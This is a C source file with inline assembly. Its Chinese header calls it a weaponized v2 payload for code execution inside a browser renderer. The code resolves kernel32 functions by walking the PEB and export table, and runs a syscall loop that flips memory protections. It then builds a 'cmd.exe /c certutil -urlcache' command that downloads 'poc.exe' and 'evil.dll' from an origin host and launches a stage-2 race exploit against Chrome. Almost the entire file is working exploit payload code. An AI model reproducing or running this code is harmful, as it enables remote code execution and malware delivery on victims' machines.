/* payload_src_w2.c — 武器化 v2：渲染器内零 DLL 加载。
 * IAT→kernel32 扫描→解析 GetTempPathA/GetModuleFileNameA/CreateProcessA→
 * 一条 cmd.exe /c certutil 下载 stage-2 并启动 poc。全 ASCII，零本地路径。 */
typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

__attribute__((naked, used)) static void flip_thread(void) {
  __asm__ volatile(
      "movabsq $0x10201000, %r10\n\t"
      "1:\n\t"
      "movq %r10, %r11\n\t"
      "2:\n\t"
      "movq (%r11), %rax\n\t"
      "testq %rax, %rax\n\t"
      "jz 1b\n\t"
      "subq $0x48, %rsp\n\t"
      "movq %rax, 0x30(%rsp)\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movl $0, 0x40(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $1, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $4, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "addq $0x48, %rsp\n\t"
      "addq $8, %r11\n\t"
      "pause\n\t"
      "jmp 2b\n\t");
}
__attribute__((naked, used)) static void flip_end_marker(void) {}
__attribute__((used, section(".text"))) static const unsigned char g_pad[0x98] = {0x90};

__attribute__((used, section(".text"))) static const char g_names[] =
  "GetTempPathA\0GetModuleFileNameA\0CreateProcessA\0";
__attribute__((used, section(".text"))) const char g_origin[72] = {'h','t','t','p',0};
__attribute__((used, section(".text"))) static const char g_pfx[] =
  "cmd.exe /c certutil -urlcache -split -f ";
__attribute__((used, section(".text"))) static const char g_mid1[] = "/poc.exe ";
__attribute__((used, section(".text"))) static const char g_mid2[] =
  "ms64.exe & certutil -urlcache -split -f ";
__attribute__((used, section(".text"))) static const char g_mid3[] = "/evil.dll ";
__attribute__((used, section(".text"))) static const char g_mid4[] =
  "ev64.dll & md ";
__attribute__((used, section(".text"))) static const char g_mid5[] =
  "msdb 2>nul & ";
__attribute__((used, section(".text"))) static const char g_mid6[] =
  "ms64.exe --handler \"";
__attribute__((used, section(".text"))) static const char g_mid7[] =
  "\" --db \"";
__attribute__((used, section(".text"))) static const char g_suf[] =
  "msdb\" --mode race --iters 8 --pages 41 --calc --dbg";

static char* acat(char* d, const char* s) { while (*s) *d++ = *s++; return d; }
static char* acat_v(char* d, volatile const char* s) { while (*s) *d++ = *s++; return d; }

static int name_eq(volatile const char* e, const char* w) {
  while (*w) { if (*e++ != *w++) return 0; }
  return *e == 0;
}
static u64 find_export(u64 mod, const char* want) {
  u32 lfa = *(volatile u32*)(mod + 0x3C);
  volatile u32* pe = (volatile u32*)(mod + lfa);
  if (pe[0] != 0x00004550u) return 0;
  volatile u32* opt = (volatile u32*)((char*)pe + 0x18);
  u32 expRva = *(volatile u32*)((char*)opt + 0x70);
  if (!expRva) return 0;
  volatile u32* exp = (volatile u32*)(mod + expRva);
  u32 nNames = exp[6]; u32 funcsRva = exp[7]; u32 namesRva = exp[8]; u32 ordsRva = exp[9];
  volatile u32* names = (volatile u32*)(mod + namesRva);
  volatile u32* funcs = (volatile u32*)(mod + funcsRva);
  volatile u16* ords  = (volatile u16*)(mod + ordsRva);
  for (u32 i = 0; i < nNames && i < 4096; i++) {
    if (name_eq((volatile const char*)(mod + names[i]), want)) return mod + funcs[ords[i]];
  }
  return 0;
}

__attribute__((noinline, used)) void payload_main(void) {
  u64 peb;
  __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
  u64 base = *(volatile u64*)(peb + 0x10);
  u64 llw  = *(volatile u64*)(base + 0x3BE4B8);
  if (llw < 0x10000 || llw > 0x7ffe00000000ull) return;
  u64 k32 = llw & ~0xFFFull;
  int ok = 0;
  for (int i = 0; i < 512; i++, k32 -= 0x1000ull) {
    if (*(volatile u16*)k32 == 0x5A4Du) {
      u32 lfa2 = *(volatile u32*)(k32 + 0x3C);
      if (lfa2 < 0x400 && *(volatile u32*)(k32 + lfa2) == 0x00004550u) { ok = 1; break; }
    }
  }
  if (!ok) return;
  u64 pTmp  = find_export(k32, g_names);            /* GetTempPathA */
  u64 pGmf  = find_export(k32, g_names + 13);       /* GetModuleFileNameA */
  u64 pCreP = find_export(k32, g_names + 32);       /* CreateProcessA */
  if (!pTmp || !pGmf || !pCreP) return;
  u32 (*GetTempPathA)(u32, char*) = (void*)pTmp;
  u32 (*GetModuleFileNameA)(void*, char*, u32) = (void*)pGmf;
  int (*CreateProcessA)(const char*, char*, void*, void*, int, u32, void*, const char*, void*, void*) = (void*)pCreP;

  char tmp[280], chrome[1044], cmd[2048];
  if (GetTempPathA(276, tmp) == 0) return;
  if (GetModuleFileNameA(0, chrome, 1040) == 0) return;

  char* d = cmd;
  d = acat(d, g_pfx);            /* cmd.exe /c certutil -urlcache -split -f */
  d = acat_v(d, g_origin);       /* http://127.0.0.1:PORT */
  d = acat(d, g_mid1);          /* /poc.exe */
  d = acat(d, tmp); d = acat(d, g_mid2);   /* ms64.exe & certutil ... -f */
  d = acat_v(d, g_origin);
  d = acat(d, g_mid3);          /* /evil.dll */
  d = acat(d, tmp); d = acat(d, g_mid4);   /* ev64.dll & md */
  d = acat(d, tmp); d = acat(d, g_mid5);   /* msdb 2>nul & */
  d = acat(d, tmp); d = acat(d, g_mid6);   /* ms64.exe --handler " */
  d = acat(d, chrome);          /* chrome full path */
  d = acat(d, g_mid7);          /* " --db " */
  d = acat(d, tmp); d = acat(d, g_suf);    /* msdb" --mode race ... */
  *d = 0;

  char si[104], pi[24];
  for (int i = 0; i < 104; i++) si[i] = 0;
  *(u32*)si = 68;                /* si.cb = sizeof(STARTUPINFOA) */
  for (int i = 0; i < 24; i++) pi[i] = 0;
  CreateProcessA(0, cmd, 0, 0, 0, 0, 0, tmp, (void*)si, (void*)pi);
}
